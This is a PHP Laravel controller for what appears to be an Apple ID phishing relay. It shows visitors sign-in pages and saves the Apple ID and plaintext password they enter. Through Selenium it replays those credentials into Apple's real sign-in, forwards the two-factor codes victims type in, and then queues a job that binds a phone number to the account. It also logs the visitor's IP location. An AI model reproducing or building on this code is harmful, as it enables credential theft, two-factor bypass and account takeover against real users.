<?php

namespace App\Http\Controllers;

use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\Exception\AccountLockoutException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User\UserFactory;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use App\Selenium\AppleClient\Exception\AccountException;
use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthenticationPage;
use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthWithDevicePage;
use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthWithPhonePage;
use App\Selenium\AppleClient\Request\SignInRequest;
use App\Selenium\ConnectorManager;
use App\Selenium\Exception\PageErrorException;
use App\Selenium\Exception\PageException;
use Facebook\WebDriver\Exception\NoSuchElementException;
use Facebook\WebDriver\Exception\TimeoutException;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use InvalidArgumentException;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Psr\SimpleCache\CacheInterface;
use Saloon\Exceptions\Request\ClientException;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;
use Saloon\Exceptions\SaloonException;
use Symfony\Component\DependencyInjection\Exception\RuntimeException;
use Weijiajia\IpConnector;
use Weijiajia\Requests\PconLineRequest;
use Weijiajia\Responses\IpResponse;

class IndexController extends Controller
{


    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
        protected UserFactory $userFactory,
        protected ConnectorManager $connectorManager,
    )
    {

    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {
        $guid = sha1(microtime());

        $IpConnector = new IpConnector();
        $apple = $this->appleFactory->create($guid);

        try {

            $response = $IpConnector->send(new PconLineRequest(ip: $this->request->ip()));

            /**
             * @var IpResponse $ipaddress
             */
            $ipaddress = $response->dto();

            $apple->getUser()->add('ipaddress',$ipaddress);

            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
        } catch (SaloonException $e) {

        }

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid));
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountException
     * @throws NoSuchElementException
     * @throws PageException
     * @throws TimeoutException
     * @throws PageErrorException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        $guid = $request->cookie('Guid',null);

        $connector = $this->connectorManager->createConnector();
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$accountName}/"));

        $response = $connector->send(new SignInRequest());

        /**
         * @var \App\Selenium\AppleClient\Page\SignIn\SignInPage $page
         */
        $page = $response->getPage();

        $authPage = $page->sign($accountName,$password);

        $account = Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);

        $user = $this->userFactory->create($guid);
        $user->setAccount($account);

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));

        $this->connectorManager->add($guid,$connector);

        if ($authPage instanceof SignInSelectPhonePage){

            $user->setPhoneInfo($authPage->getPhoneLists());

            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
            ],code: 202);
        }

        if ($authPage instanceof TwoFactorAuthWithDevicePage){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => true,
            ],code: 201);
        }

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => true,
        ],code: 203);
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @return View
     * @throws NoSuchElementException
     * @throws TimeoutException
     */
    public function authPhoneList(): View
    {
        $guid = $this->request->input('Guid',null);

        $connector = $this->connectorManager->getConnector($guid);

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        $page = new SignInSelectPhonePage($connector);

        return view('index.auth-phone-list',['trustedPhoneNumbers' => $page->getPhoneLists()]);
    }

    /**
     * 验证安全码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws VerificationCodeIncorrect|PageException
     */
    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();
        $code = $validated['apple_verifycode'];
        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        try {

            $connector = $this->connectorManager->getConnector($guid);
            $connector->config()
                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

            $page = new TwoFactorAuthWithDevicePage($connector);

            $page->inputTrustedCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $user->getAccount(),description: "安全码验证成功 code:{$code}"));

        } catch (VerificationCodeIncorrect $e) {

            $e->getPage()->takeScreenshot("verifySecurityCode.png");

            Event::dispatch(new AccountAuthFailEvent(account: $user->getAccount(),description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($guid,$account);

        return $this->success([]);
    }


    /**
     * 验证手机验证码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect
     * @throws ConnectionException
     */
    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        $code = $validated['apple_verifycode'];

        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector = $this->connectorManager->getConnector($guid);
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        // 验证手机号码
        try {

            $page = new TwoFactorAuthWithPhonePage($connector);

            $page->inputTrustedCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));

        } catch (VerificationCodeIncorrect $e) {

            $e->getPage()->takeScreenshot("verifySecurityCode.png");

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: (string)($e->getMessage())));
            throw $e;
        }

        BindAccountPhone::dispatch($guid,$account);

        return $this->success();
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws NoSuchElementException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $guid = $this->request->input('Guid');

        $connector = $this->connectorManager->getConnector($guid);

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        $page = new TwoFactorAuthWithDevicePage($connector);

        $page->resendCode();

        sleep(3);

        return $this->success();
    }

    public function resendCode()
    {
        $guid = $this->request->input('Guid');

        $connector = $this->connectorManager->getConnector($guid);

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        $page = new TwoFactorAuthWithPhonePage($connector);

        $page->resendCode();

        sleep(3);

        return $this->success();
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws NoSuchElementException
     * @throws PageException
     */
    public function GetPhone(): JsonResponse
    {
        $guid = $this->request->input('Guid');

        $connector = $this->connectorManager->getConnector($guid);

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

        $page = new TwoFactorAuthWithDevicePage($connector);

        $authPage = $page->usePhoneNumber();

        if ($authPage instanceof SignInSelectPhonePage){

            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
            ],code: 202);
        }

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => true,
        ],code: 203);
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws ValidationException|PageException
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:0',
        ])->validated();


        try {

            $guid = $this->request->input('Guid');

            $user = $this->userFactory->create($guid);
            if (! $account = $user->getAccount()){
                throw new \RuntimeException('账号信息不存在');
            }
            $connector = $this->connectorManager->getConnector($guid);
            $connector->config()
                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));

            $page = new SignInSelectPhonePage($connector);
            $page->selectPhone($params['ID']);

        } catch (PageException $e) {

            return $this->error($e->getMessage() ?: "Too many verification codes have been sent. Enter the last code you received, use one of your devices, or try again later.",400);
        }

        return $this->success();
    }

    public function sms(): View|Factory|Application
    {
        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector = $this->connectorManager->getConnector($guid);
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));


        $page = new TwoFactorAuthWithPhonePage($connector);

        $useDifferentPhoneNumber = (bool) $page->getUseDifferentPhoneNumberButton();

        return view('index/sms',[
            'phoneNumber' => $this->request->input('Number'),
            'useDifferentPhoneNumber' => $useDifferentPhoneNumber,
        ]);
    }

    public function useDifferentPhoneNumber()
    {
        $guid = $this->request->input('Guid');

        $user = $this->userFactory->create($guid);
        if (! $account = $user->getAccount()){
            throw new \RuntimeException('账号信息不存在');
        }

        $connector = $this->connectorManager->getConnector($guid);
        $connector->config()
            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));


        $page = new TwoFactorAuthWithPhonePage($connector);
        $page->useDifferentPhoneNumber();

        return $this->success();
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
